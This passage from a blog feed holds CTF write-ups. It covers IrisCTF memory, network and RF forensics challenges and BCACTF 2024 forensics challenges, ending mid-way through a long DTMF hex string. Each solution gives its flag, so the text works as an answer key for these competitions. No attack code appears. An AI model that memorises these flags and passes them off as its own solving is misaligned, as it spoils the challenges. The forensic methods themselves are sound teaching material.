class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~/volatility3$ python3 vol.py -f memdump.mem windows.pslist</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class="line"></span><br><span class="line">4       0       System  0xe38cb727f6c0  98      -       N/A     False   2025-01-03 16:50:11.000000      N/A     Disabled</span><br><span class="line">260     4       smss.exe        0xe38cb79de040  2       -       N/A     False   2025-01-03 16:50:11.000000      N/A     Disabled</span><br><span class="line">364     356     csrss.exe       0xe38cb7aa2440  9       -       0       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">428     260     smss.exe        0xe38cb7d79380  0       -       1       False   2025-01-03 16:50:12.000000      2025-01-03 16:50:12.000000      Disabled</span><br><span class="line">436     428     csrss.exe       0xe38cb7d95340  11      -       1       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">444     356     wininit.exe     0xe38cb7d9a080  1       -       0       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">488     428     winlogon.exe    0xe38cb7980080  4       -       1       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">548     444     services.exe    0xe38cb7f8c080  5       -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">556     444     lsass.exe       0xe38cb7f89080  7       -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">628     548     svchost.exe     0xe38cb7fdc4c0  17      -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">672     548     svchost.exe     0xe38cb83ed180  10      -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">780     488     dwm.exe 0xe38cbae30080  12      -       1       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">888     548     svchost.exe     0xe38cbaeac500  46      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">896     548     svchost.exe     0xe38cbaeb8340  19      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">904     548     svchost.exe     0xe38cbaebd800  23      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">948     548     svchost.exe     0xe38cbaee1800  12      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">964     548     svchost.exe     0xe38cbaeea800  18      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">624     548     svchost.exe     0xe38cbaf45800  24      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1076    548     svchost.exe     0xe38cb82032c0  20      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1132    548     svchost.exe     0xe38cb824f800  6       -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1360    548     svchost.exe     0xe38cb82eb080  6       -       0       False   2025-01-03 16:50:15.000000      N/A     Disabled</span><br><span class="line">1696    548     svchost.exe     0xe38cb83d3800  11      -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1776    548     svchost.exe     0xe38cb8006800  5       -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1784    548     svchost.exe     0xe38cb800f800  9       -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1832    548     MsMpEng.exe     0xe38cb83e6340  27      -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">2676    548     NisSrv.exe      0xe38cbb0bf800  3       -       0       False   2025-01-03 16:50:23.000000      N/A     Disabled</span><br><span class="line">2144    628     RuntimeBroker.  0xe38cb81a2080  12      -       1       False   2025-01-03 16:50:59.000000      N/A     Disabled</span><br><span class="line">2208    548     svchost.exe     0xe38cbb1de080  7       -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2220    888     sihost.exe      0xe38cbb1f8800  10      -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2276    888     taskhostw.exe   0xe38cb8140080  11      -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2592    488     userinit.exe    0xe38cbb202080  0       -       1       False   2025-01-03 16:51:01.000000      2025-01-03 16:51:31.000000      Disabled</span><br><span class="line">2856    2592    explorer.exe    0xe38cbb239800  70      -       1       False   2025-01-03 16:51:01.000000      N/A     Disabled</span><br><span class="line">2064    628     ShellExperienc  0xe38cbb2a4800  28      -       1       False   2025-01-03 16:51:03.000000      N/A     Disabled</span><br><span class="line">2216    628     SearchUI.exe    0xe38cbb2e3800  16      -       1       False   2025-01-03 16:51:04.000000      N/A     Disabled</span><br><span class="line">3248    2312    ServerManager.  0xe38cbb3d3800  13      -       1       False   2025-01-03 16:51:06.000000      N/A     Disabled</span><br><span class="line">3472    628     dllhost.exe     0xe38cb75b3340  2       -       1       False   2025-01-03 16:52:20.000000      N/A     Disabled</span><br><span class="line">3464    548     msdtc.exe       0xe38cb75c7800  9       -       0       False   2025-01-03 16:52:21.000000      N/A     Disabled</span><br><span class="line">1604    488     fontdrvhost.ex  0xe38cb75d8080  5       -       1       False   2025-01-03 16:54:00.000000      N/A     Disabled</span><br><span class="line">3036    4060    firefox.exe     0xe38cb818b500  89      -       1       True    2025-01-03 16:55:40.000000      N/A     Disabled</span><br><span class="line">3968    3036    firefox.exe     0xe38cb75b9080  22      -       1       True    2025-01-03 16:55:41.000000      N/A     Disabled</span><br><span class="line">3624    3036    firefox.exe     0xe38cbb380080  5       -       1       True    2025-01-03 16:55:41.000000      N/A     Disabled</span><br><span class="line">3828    3036    firefox.exe     0xe38cbb539800  17      -       1       True    2025-01-03 16:55:43.000000      N/A     Disabled</span><br><span class="line">2420    3036    firefox.exe     0xe38cbb711800  5       -       1       True    2025-01-03 16:55:44.000000      N/A     Disabled</span><br><span class="line">4076    3036    firefox.exe     0xe38cbb116080  17      -       1       True    2025-01-03 16:55:45.000000      N/A     Disabled</span><br><span class="line">3132    3036    firefox.exe     0xe38cbb1e1080  5       -       1       True    2025-01-03 16:55:47.000000      N/A     Disabled</span><br><span class="line">712     628     ApplicationFra  0xe38cbb573080  1       -       1       False   2025-01-03 16:56:02.000000      N/A     Disabled</span><br><span class="line">5044    3036    firefox.exe     0xe38cbb7c8800  5       -       1       True    2025-01-03 16:56:43.000000      N/A     Disabled</span><br><span class="line">4772    3036    firefox.exe     0xe38cbb0d6300  18      -       1       True    2025-01-03 16:57:38.000000      N/A     Disabled</span><br><span class="line">1380    2856    FTK Imager.exe  0xe38cbb82e800  20      -       1       False   2025-01-03 17:02:19.000000      N/A     Disabled</span><br><span class="line">5324    3036    firefox.exe     0xe38cbba94080  19      -       1       True    2025-01-03 17:09:52.000000      N/A     Disabled</span><br><span class="line">5804    3036    firefox.exe     0xe38cbb261080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">2308    3036    firefox.exe     0xe38cbbb44080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">2712    3036    firefox.exe     0xe38cbba16080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">3328    3036    firefox.exe     0xe38cbb8c6800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">6256    3036    firefox.exe     0xe38cbb884800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5288    3036    firefox.exe     0xe38cbb8a9800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5664    3036    firefox.exe     0xe38cbb7c9080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5196    3036    firefox.exe     0xe38cbb8c0800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">4508    3036    firefox.exe     0xe38cbbbe8800  19      -       1       True    2025-01-03 17:09:59.000000      N/A     Disabled</span><br><span class="line">4344    3036    firefox.exe     0xe38cbbbb8080  19      -       1       True    2025-01-03 17:10:00.000000      N/A     Disabled</span><br><span class="line">928     3036    firefox.exe     0xe38cbbc8c080  19      -       1       True    2025-01-03 17:10:00.000000      N/A     Disabled</span><br><span class="line">740     3036    firefox.exe     0xe38cbb89e400  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">2252    3036    firefox.exe     0xe38cb7e25080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">2920    3036    firefox.exe     0xe38cbbc9e080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">3124    3036    firefox.exe     0xe38cbbca0080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">7116    3036    firefox.exe     0xe38cb7e32680  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">6344    628     smartscreen.ex  0xe38cbbcd9080  13      -       1       False   2025-01-03 17:10:06.000000      N/A     Disabled</span><br><span class="line">7292    7052    MpCmdRun.exe    0xe38cbbad5800  5       -       0       False   2025-01-03 17:10:10.000000      N/A     Disabled</span><br><span class="line">8136    8112    Taskmgr.exe     0xe38cbb713800  15      -       1       False   2025-01-03 17:10:50.000000      N/A     Disabled</span><br><span class="line">4124    628     WmiPrvSE.exe    0xe38cbba9e800  10      -       0       False   2025-01-03 17:11:13.000000      N/A     Disabled</span><br><span class="line">5628    628     WmiPrvSE.exe    0xe38cb7d80080  9       -       0       False   2025-01-03 17:11:13.000000      N/A     Disabled</span><br></pre></td></tr></table></figure><p>This tells us that at the time of memory capture <code>firefox.exe</code> had been running and also since it only happens to be any process to concern, so the next step was to dump the memory of the proces firefox.exe (PID: 3036)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python3</span> vol.py -f memdump.mem windows.memmap --pid 3036 --dump</span><br></pre></td></tr></table></figure><p>Now I had my firefox process dump and since its a browser so the most sensible thing to search for was URLs but that happened to be too many so now it was just some trial and error until we get the result that it was a google URL that happened to encode our flag in base64.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">.</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h4 id="Decoding-our-Flag"><a href="#Decoding-our-Flag" class="headerlink" title="Decoding our Flag"></a>Decoding our Flag</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$echo</span> <span class="string">&quot;aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Cheesy-Approach"><a href="#Cheesy-Approach" class="headerlink" title="Cheesy Approach"></a>Cheesy Approach</h4><p>After the CTF ended the discussion led to the relevation that just the string search the base64 encoding of <code>irisct</code> could yield this URL and hence the flag as well.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~/volatility3$ strings memdump.mem | grep aXJpc2N0</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Z</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2l</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Z</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2F</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0Zn</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0Zn</span><br><span class="line">O^firstPartyDomain=google-b-d.search.suggestions.mozilla,a,::https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">.</span><br><span class="line">..</span><br></pre></td></tr></table></figure><h2 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h2><h3 id="No-Shark"><a href="#No-Shark" class="headerlink" title="No Shark?"></a>No Shark?</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall3.png" alt="Description"></p><p>Source File: <a href="/./files/noshark.tar.gz">noshark.tar.gz</a></p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>We received a text file for this challenge which contained some hex encoded data that on initial inspection on cyberchef, happened to be a tcp packet data file.</p><p><img src="/./images/file.png" alt="Given Data"></p><p>On analysing the initial data streams, the first lengthy stream happened to catch my eye with <code>JFIF</code> magic bytes being evidently present which made me believe these are the data packets of a TCP file transfer stream wherein a .jpeg file was sent and hopefully that should contain our flag as well.</p><p><img src="/./images/first_segment.png" alt="Initial Data"></p><h4 id="Constructing-the-image"><a href="#Constructing-the-image" class="headerlink" title="Constructing the image"></a>Constructing the image</h4><p>We can write a simple python script to do the task i.e. remove the first 64 bytes of all data that correspond to tcp headers and hence happen to be same alternatively, and just take and concat the payload bytes to a new file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">input_file_path = <span class="string">&quot;noshark.txt&quot;</span></span><br><span class="line">output_file_path = <span class="string">&quot;output.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> input_file, <span class="built_in">open</span>(output_file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> input_file:</span><br><span class="line">        processed_line = line.strip()</span><br><span class="line">        hex_data += processed_line[<span class="number">132</span>:]</span><br><span class="line">    trimmed_data = hex_data[<span class="number">32</span>:]</span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(trimmed_data)</span><br><span class="line">    output_file.write(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Data has been successfully processed and saved to <span class="subst">&#123;output_file_path&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/./images/output.jpg" alt="Constructed Image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;welcome_to_net_its_still_ez_to_read_caps_without_wireshark&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RF"><a href="#RF" class="headerlink" title="RF"></a>RF</h2><h3 id="dotdotdot"><a href="#dotdotdot" class="headerlink" title="dotdotdot"></a>dotdotdot</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall4.png" alt="Description"></p><p>Source File: <a href="/./files/dotdotdot.tar.gz">dotdotdot.tar.gz</a></p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a .iq file, which are standard RF signal files, so the first step was to convert it to corresponding .wav file which can be easily done using the following commnd.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox -e <span class="built_in">float</span> -t raw -r 192000 -b 32 -c 2 dotdotdot.iq -t wav -e <span class="built_in">float</span> -b 32 -c 2 -r 192000 output.wav</span><br></pre></td></tr></table></figure><p>Once we have the data as the wav file, the first thing to inspect was obviously the spectrogram and once we do so, we immediately observe a morse codee present at one of the frequncies.</p><p><img src="/./images/spectrogram.png" alt="Spectrogram"></p><h4 id="Constructing-the-Flag"><a href="#Constructing-the-Flag" class="headerlink" title="Constructing the Flag"></a>Constructing the Flag</h4><p>Now it would have been ideal to apply a low pass filter to make the morse more predominent and then use audio morse decoder but I just went on with manual decoding of the morse using a morse conversion sheet.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;n01s3_g0t_n0th1ng_0n_my_m0rse&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> Wireshark </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCACTF 5.0 2024</title>
      <link href="/2024/06/12/BCACTF-5-0-2024/"/>
      <url>/2024/06/12/BCACTF-5-0-2024/</url>
      
        <content type="html"><![CDATA[<p>I participated in BCACTF 2024, as a core member of the team InfoSecIITR. Our team secured 7th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition.</p><h2 id="Forensics-23-719-writeup"><a href="#Forensics-23-719-writeup" class="headerlink" title="Forensics&#x2F;23-719-writeup"></a>Forensics&#x2F;23-719-writeup</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a pdf along with the following description:</p><p>That’s a nice unanimous supreme court decision you’ve made public, sure would be a shame if someone didn’t properly clean up remnants of a prior version of the document before publishing it.</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>The solution was pretty straight forward we just find for the initials of the flag i.e. <code>bacactf</code> and highlight some of the text </p><p><img src="/./images/23-719_1.png" alt="Image 1"></p><p> So we select that text and paste it in a text editor and we reveal the flag :</p><p><img src="/./images/23-719_2.png" alt="Image 2"></p><p>So our flag becomes -&gt;</p><p><code>bcactf&#123;rEAl_WOrLd_appLIc4t1ons_Of_cTf_ad04cc78601d5da8&#125;</code></p><p>………………………………………………………..</p><h2 id="Forensics-sheep-writeup"><a href="#Forensics-sheep-writeup" class="headerlink" title="Forensics&#x2F;sheep-writeup"></a>Forensics&#x2F;sheep-writeup</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a .shp along with the following hint:</p><p>Figure out what type of file it is and see if there are tools you can use or modify.</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Upon some research we find out that .shp are ESRI shapefiles used in GIS softwares like Google Earth Pro but such softwares require 3 of such files as mandatory which are a .shp, .shx and a .dbf file which work complementorily to produce the geographical data but some more reserach yielded this software that can standalone process a .shp file (<a href="https://softradar.com/shp-viewer/">https://softradar.com/shp-viewer/</a>). So we just load our sheep.shp in the software and thats it we get the flag :</p><p><img src="/./images/sheep_1.png" alt="Image 1"></p><p>So our flag becomes -&gt;</p><p><code>bcactf&#123;SHaPE_f1lEd_b54a11ac9c87c8&#125;</code></p><p>………………………………………………………….</p><h2 id="Forensics-Manipulate-Spreadsheet-2-writeup"><a href="#Forensics-Manipulate-Spreadsheet-2-writeup" class="headerlink" title="Forensics&#x2F;Manipulate Spreadsheet 2-writeup"></a>Forensics&#x2F;Manipulate Spreadsheet 2-writeup</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given an excel file for this challenge:</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>The first that we notice is this long string written in the A1 cell of the excel sheet.</p><p><img src="/./images/Manipulate_Spreadsheet_2_1.png" alt="Image 1"></p><p>The hex decode of this string reveals the following hint:</p><pre><code>In digital fields where data lies,Secret pages beneath clear skies.Cells entwine, mysteries feel,Layers of secrets they reveal.</code></pre><p>The layers part hint that there maybe a hidden sheet in this file and exactly that happens to be the case we unhide the sheet 2 of this excel file and there we find some bytes and index data along with another hint in the A1 cell of the sheet</p><p><img src="/./images/Manipulate_Spreadsheet_2_2.png" alt="Image 2"></p><p>The hex decode of this hint reveals:</p><pre><code>Lurking shadows, secrets play,Stealthy whispers on display.BITS aligned, LEAST in SIGht,Gleams of secrets, veiled in light.</code></pre><p>This reveals that we have to arrange the bytes in order of indices and then do LSB extract of the bytes so we do that and we get our flag as:</p><p><code>bcactf&#123;600D_job_Using_900G13_SHe3t5&#125;</code></p><p>…………………………………………………..</p><h2 id="Forensics-Touch-Tone-Telephone-writeup"><a href="#Forensics-Touch-Tone-Telephone-writeup" class="headerlink" title="Forensics&#x2F;Touch Tone Telephone-writeup"></a>Forensics&#x2F;Touch Tone Telephone-writeup</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a .wav along with the following hints:</p><pre><code>-DTMF is a really cool technology-There also used to be A, B, C, and D menu selection keys-How many keys are there in total? Is it a computer science-y number?-For key to number, Start at top left, reading order. (Sorry, 0 is not 0, my bad)</code></pre><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>Based on the hints the course of action gets pretty much cleared that we need to extract the dtmf tones of our wav file then perform a little substitution of keys before finally hex decoding the message. Now there are many online tools to detect the dtmf tones of a wav file but I used the CLI tool <code>multimon-ng</code> which gives us a result for the detected dtmf tones as </p><p><code>47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA43B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BBD4648</code></p><p>But due to the speed of the wav file some of the dtmf tones get overlapped in this result and doing some manual patching of this result we get the final dtmf tones as :</p><p><code>47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564